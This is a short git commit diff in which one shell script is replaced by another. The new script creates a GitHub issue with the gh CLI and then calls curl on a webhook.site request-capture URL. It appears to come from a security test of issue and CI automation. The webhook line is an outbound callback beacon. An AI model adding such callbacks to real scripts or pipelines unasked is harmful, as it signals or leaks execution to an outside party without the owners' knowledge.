f5c535b4b612f298d940a7bde06ec7a20c702e6c
Mauricio <uaxp123@gmail.com>
2021-11-03 02:35:55 -0500

    Update and rename s2.sh to s3.sh

--- s2.sh
+++
@@ -1,2 +0,0 @@
-echo readyyyy > /tmp/comment.bounce
-gh issue comment $(gh issue create --title 'incrediblysecureinc/comment-ops-amauricio' --body 'Comment Ops Coming Up!' --repo incrediblysecureinc/comment-ops-mauricio) --body-file /tmp/comment.bounce
---
+++ s3.sh
@@ -0,0 +1,2 @@
+gh issue create --title 'incrediblysecureinc/comment-ops-amauricio' --body 'Comment Ops Coming Up!' --repo incrediblysecureinc/comment-ops-mauricio
+curl https://webhook.site/bee9e625-eb7c-4274-9aaf-76c6f6c88b22
